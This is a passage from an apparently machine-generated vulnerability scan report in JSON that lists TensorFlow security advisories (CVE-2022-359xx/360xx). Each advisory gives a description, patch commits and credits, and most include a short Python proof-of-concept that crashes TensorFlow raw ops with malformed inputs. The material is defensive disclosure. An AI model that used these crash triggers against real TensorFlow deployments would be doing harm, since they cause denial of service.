                "text": "Vulnerability CVE-2022-35969\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35969](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35969)\n### Impact\nThe implementation of `Conv2DBackpropInput` requires `input_sizes` to be 4-dimensional. Otherwise, it gives a `CHECK` failure which can be used to trigger a denial of service attack:\n```python\nimport tensorflow as tf\n\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\nuse_cudnn_on_gpu = True\nexplicit_paddings = []\ndata_format = \"NHWC\"\ndilations = [1, 1, 1, 1]\ninput_sizes = tf.constant([65534,65534], shape=[2], dtype=tf.int32)\nfilter = tf.constant(0.159749106, shape=[3,3,2,2], dtype=tf.float32)\nout_backprop = tf.constant(0, shape=[], dtype=tf.float32)\ntf.raw_ops.Conv2DBackpropInput(input_sizes=input_sizes, filter=filter, out_backprop=out_backprop, strides=strides, padding=padding, use_cudnn_on_gpu=use_cudnn_on_gpu, explicit_paddings=explicit_paddings, data_format=data_format, dilations=dilations)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [50156d547b9a1da0144d7babe665cf690305b33c](https://github.com/tensorflow/tensorflow/commit/50156d547b9a1da0144d7babe665cf690305b33c).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-35969**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35969](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35969)|\n\n### Impact\nThe implementation of `Conv2DBackpropInput` requires `input_sizes` to be 4-dimensional. Otherwise, it gives a `CHECK` failure which can be used to trigger a denial of service attack:\n```python\nimport tensorflow as tf\n\nstrides = [1, 1, 1, 1]\npadding = \"SAME\"\nuse_cudnn_on_gpu = True\nexplicit_paddings = []\ndata_format = \"NHWC\"\ndilations = [1, 1, 1, 1]\ninput_sizes = tf.constant([65534,65534], shape=[2], dtype=tf.int32)\nfilter = tf.constant(0.159749106, shape=[3,3,2,2], dtype=tf.float32)\nout_backprop = tf.constant(0, shape=[], dtype=tf.float32)\ntf.raw_ops.Conv2DBackpropInput(input_sizes=input_sizes, filter=filter, out_backprop=out_backprop, strides=strides, padding=padding, use_cudnn_on_gpu=use_cudnn_on_gpu, explicit_paddings=explicit_paddings, data_format=data_format, dilations=dilations)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [50156d547b9a1da0144d7babe665cf690305b33c](https://github.com/tensorflow/tensorflow/commit/50156d547b9a1da0144d7babe665cf690305b33c).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35974",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35974"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35974",
              "help": {
                "text": "Vulnerability CVE-2022-35974\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35974](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35974)\n### Impact\nIf `QuantizeDownAndShrinkRange` is given nonscalar inputs for `input_min` or `input_max`, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.quint8\ninput = tf.constant([1], shape=[3], dtype=tf.qint32)\ninput_min = tf.constant([], shape=[0], dtype=tf.float32)\ninput_max = tf.constant(-256, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizeDownAndShrinkRange(input=input, input_min=input_min, input_max=input_max, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [73ad1815ebcfeb7c051f9c2f7ab5024380ca8613](https://github.com/tensorflow/tensorflow/commit/73ad1815ebcfeb7c051f9c2f7ab5024380ca8613).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-35974**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35974](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35974)|\n\n### Impact\nIf `QuantizeDownAndShrinkRange` is given nonscalar inputs for `input_min` or `input_max`, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.quint8\ninput = tf.constant([1], shape=[3], dtype=tf.qint32)\ninput_min = tf.constant([], shape=[0], dtype=tf.float32)\ninput_max = tf.constant(-256, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizeDownAndShrinkRange(input=input, input_min=input_min, input_max=input_max, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [73ad1815ebcfeb7c051f9c2f7ab5024380ca8613](https://github.com/tensorflow/tensorflow/commit/73ad1815ebcfeb7c051f9c2f7ab5024380ca8613).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36003",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36003"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36003",
              "help": {
                "text": "Vulnerability CVE-2022-36003\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36003](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36003)\n### Impact\nWhen `RandomPoissonV2` receives large input shape and rates, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)\narg_1=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float32, maxval=None)\narg_2=0\narg_3=0\narg_4=tf.int32\narg_5=None\ntf.raw_ops.RandomPoissonV2(shape=arg_0, rate=arg_1, seed=arg_2,\n                           seed2=arg_3, dtype=arg_4, name=arg_5)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [552bfced6ce4809db5f3ca305f60ff80dd40c5a3](https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n",
                "markdown": "**Vulnerability CVE-2022-36003**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36003](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36003)|\n\n### Impact\nWhen `RandomPoissonV2` receives large input shape and rates, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)\narg_1=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float32, maxval=None)\narg_2=0\narg_3=0\narg_4=tf.int32\narg_5=None\ntf.raw_ops.RandomPoissonV2(shape=arg_0, rate=arg_1, seed=arg_2,\n                           seed2=arg_3, dtype=arg_4, name=arg_5)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [552bfced6ce4809db5f3ca305f60ff80dd40c5a3](https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35959",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35959"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35959",
              "help": {
                "text": "Vulnerability CVE-2022-35959\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35959](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35959)\n### Impact\nThe implementation of `AvgPool3DGradOp` does not fully validate the input `orig_input_shape`. This results in an overflow that results in a  `CHECK` failure which can be used to trigger a denial of service attack:\n```python\nimport tensorflow as tf\n\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\ndata_format = \"NDHWC\"\norig_input_shape = tf.constant(1879048192, shape=[5], dtype=tf.int32)\ngrad = tf.constant(1, shape=[1,3,2,4,2], dtype=tf.float32)\ntf.raw_ops.AvgPool3DGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [9178ac9d6389bdc54638ab913ea0e419234d14eb](https://github.com/tensorflow/tensorflow/commit/9178ac9d6389bdc54638ab913ea0e419234d14eb).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-35959**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35959](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35959)|\n\n### Impact\nThe implementation of `AvgPool3DGradOp` does not fully validate the input `orig_input_shape`. This results in an overflow that results in a  `CHECK` failure which can be used to trigger a denial of service attack:\n```python\nimport tensorflow as tf\n\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\ndata_format = \"NDHWC\"\norig_input_shape = tf.constant(1879048192, shape=[5], dtype=tf.int32)\ngrad = tf.constant(1, shape=[1,3,2,4,2], dtype=tf.float32)\ntf.raw_ops.AvgPool3DGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [9178ac9d6389bdc54638ab913ea0e419234d14eb](https://github.com/tensorflow/tensorflow/commit/9178ac9d6389bdc54638ab913ea0e419234d14eb).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35960",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35960"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35960",
              "help": {
                "text": "Vulnerability CVE-2022-35960\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35960](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35960)\n### Impact\nIn [`core/kernels/list_kernels.cc`s TensorListReserve`](https://github.com/tensorflow/tensorflow/blob/c8ba76d48567aed347508e0552a257641931024d/tensorflow/core/kernels/list_kernels.cc#L322-L325), `num_elements` is assumed to be a tensor of size 1. When a `num_elements` of more than 1 element is provided, then `tf.raw_ops.TensorListReserve` fails the `CHECK_EQ` in `CheckIsAlignedAndSingleElement`.\n```python\nimport tensorflow as tf\n\ntf.raw_ops.TensorListReserve(element_shape=(1,1), num_elements=tf.constant([1,1], dtype=tf.int32), element_dtype=tf.int8)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [b5f6fbfba76576202b72119897561e3bd4f179c7](https://github.com/tensorflow/tensorflow/commit/b5f6fbfba76576202b72119897561e3bd4f179c7).\n\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin from Singapore Management University.\n",
                "markdown": "**Vulnerability CVE-2022-35960**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35960](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35960)|\n\n### Impact\nIn [`core/kernels/list_kernels.cc`s TensorListReserve`](https://github.com/tensorflow/tensorflow/blob/c8ba76d48567aed347508e0552a257641931024d/tensorflow/core/kernels/list_kernels.cc#L322-L325), `num_elements` is assumed to be a tensor of size 1. When a `num_elements` of more than 1 element is provided, then `tf.raw_ops.TensorListReserve` fails the `CHECK_EQ` in `CheckIsAlignedAndSingleElement`.\n```python\nimport tensorflow as tf\n\ntf.raw_ops.TensorListReserve(element_shape=(1,1), num_elements=tf.constant([1,1], dtype=tf.int32), element_dtype=tf.int8)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [b5f6fbfba76576202b72119897561e3bd4f179c7](https://github.com/tensorflow/tensorflow/commit/b5f6fbfba76576202b72119897561e3bd4f179c7).\n\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin from Singapore Management University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35967",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35967"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35967",
              "help": {
                "text": "Vulnerability CVE-2022-35967\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35967](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35967)\n### Impact\nIf `QuantizedAdd` is given `min_input` or `max_input` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nToutput = tf.qint32\nx = tf.constant(140, shape=[1], dtype=tf.quint8)\ny = tf.constant(26, shape=[10], dtype=tf.quint8)\nmin_x = tf.constant([], shape=[0], dtype=tf.float32)\nmax_x = tf.constant(0, shape=[], dtype=tf.float32)\nmin_y = tf.constant(0, shape=[], dtype=tf.float32)\nmax_y = tf.constant(0, shape=[], dtype=tf.float32)\ntf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y, Toutput=Toutput)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [49b3824d83af706df0ad07e4e677d88659756d89](https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",
                "markdown": "**Vulnerability CVE-2022-35967**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35967](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35967)|\n\n### Impact\nIf `QuantizedAdd` is given `min_input` or `max_input` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nToutput = tf.qint32\nx = tf.constant(140, shape=[1], dtype=tf.quint8)\ny = tf.constant(26, shape=[10], dtype=tf.quint8)\nmin_x = tf.constant([], shape=[0], dtype=tf.float32)\nmax_x = tf.constant(0, shape=[], dtype=tf.float32)\nmin_y = tf.constant(0, shape=[], dtype=tf.float32)\nmax_y = tf.constant(0, shape=[], dtype=tf.float32)\ntf.raw_ops.QuantizedAdd(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y, Toutput=Toutput)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [49b3824d83af706df0ad07e4e677d88659756d89](https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35973",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35973"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35973",
              "help": {
                "text": "Vulnerability CVE-2022-35973\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35973](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35973)\n### Impact\nIf `QuantizedMatMul` is given nonscalar input for:\n - `min_a`\n - `max_a`\n - `min_b`\n - `max_b`\nIt gives a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nToutput = tf.qint32\ntranspose_a = False\ntranspose_b = False\nTactivation = tf.quint8\na = tf.constant(7, shape=[3,4], dtype=tf.quint8)\nb = tf.constant(1, shape=[2,3], dtype=tf.quint8)\nmin_a = tf.constant([], shape=[0], dtype=tf.float32)\nmax_a = tf.constant(0, shape=[1], dtype=tf.float32)\nmin_b = tf.constant(0, shape=[1], dtype=tf.float32)\nmax_b = tf.constant(0, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedMatMul(a=a, b=b, min_a=min_a, max_a=max_a, min_b=min_b, max_b=max_b, Toutput=Toutput, transpose_a=transpose_a, transpose_b=transpose_b, Tactivation=Tactivation)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [aca766ac7693bf29ed0df55ad6bfcc78f35e7f48](https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-35973**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35973](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35973)|\n\n### Impact\nIf `QuantizedMatMul` is given nonscalar input for:\n - `min_a`\n - `max_a`\n - `min_b`\n - `max_b`\nIt gives a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nToutput = tf.qint32\ntranspose_a = False\ntranspose_b = False\nTactivation = tf.quint8\na = tf.constant(7, shape=[3,4], dtype=tf.quint8)\nb = tf.constant(1, shape=[2,3], dtype=tf.quint8)\nmin_a = tf.constant([], shape=[0], dtype=tf.float32)\nmax_a = tf.constant(0, shape=[1], dtype=tf.float32)\nmin_b = tf.constant(0, shape=[1], dtype=tf.float32)\nmax_b = tf.constant(0, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedMatMul(a=a, b=b, min_a=min_a, max_a=max_a, min_b=min_b, max_b=max_b, Toutput=Toutput, transpose_a=transpose_a, transpose_b=transpose_b, Tactivation=Tactivation)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [aca766ac7693bf29ed0df55ad6bfcc78f35e7f48](https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36011",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36011"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36011",
              "help": {
                "text": "Vulnerability CVE-2022-36011\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36011](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36011)\n### Impact\nWhen [`mlir::tfg::ConvertGenericFunctionToFunctionDef`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/functiondef_import.cc) is given empty function attributes, it gives a null dereference.\n```cpp\n// Import the function attributes with a `tf.` prefix to match the current\n// infrastructure expectations.\nfor (const auto\u0026 namedAttr : func.attr()) {\n  const std::string\u0026 name = \"tf.\" + namedAttr.first;\n  const AttrValue\u0026 tf_attr = namedAttr.second;\n  TF_ASSIGN_OR_RETURN(Attribute attr,\n                      ConvertAttributeValue(tf_attr, builder, tfgDialect));\n  attrs.append(name, attr);\n}\n```\nIf `namedAttr.first` is empty, it will crash.\n\n### Patches\nWe have patched the issue in GitHub commit [1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b](https://github.com/tensorflow/tensorflow/commit/1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n",
                "markdown": "**Vulnerability CVE-2022-36011**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36011](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36011)|\n\n### Impact\nWhen [`mlir::tfg::ConvertGenericFunctionToFunctionDef`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/functiondef_import.cc) is given empty function attributes, it gives a null dereference.\n```cpp\n// Import the function attributes with a `tf.` prefix to match the current\n// infrastructure expectations.\nfor (const auto\u0026 namedAttr : func.attr()) {\n  const std::string\u0026 name = \"tf.\" + namedAttr.first;\n  const AttrValue\u0026 tf_attr = namedAttr.second;\n  TF_ASSIGN_OR_RETURN(Attribute attr,\n                      ConvertAttributeValue(tf_attr, builder, tfgDialect));\n  attrs.append(name, attr);\n}\n```\nIf `namedAttr.first` is empty, it will crash.\n\n### Patches\nWe have patched the issue in GitHub commit [1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b](https://github.com/tensorflow/tensorflow/commit/1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36001",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36001"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36001",
              "help": {
                "text": "Vulnerability CVE-2022-36001\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36001](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36001)\n### Impact\nWhen `DrawBoundingBoxes` receives an input `boxes` that is not of dtype `float`, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\narg_0=tf.constant(value=np.random.random(size=(1, 3, 2, 3)), shape=(1, 3, 2, 3), dtype=tf.half)\narg_1=tf.constant(value=np.random.random(size=(1, 2, 4)), shape=(1, 2, 4), dtype=tf.float32)\narg_2=``\ntf.raw_ops.DrawBoundingBoxes(images=arg_0, boxes=arg_1, name=arg_2)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [da0d65cdc1270038e72157ba35bf74b85d9bda11](https://github.com/tensorflow/tensorflow/commit/da0d65cdc1270038e72157ba35bf74b85d9bda11).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n",
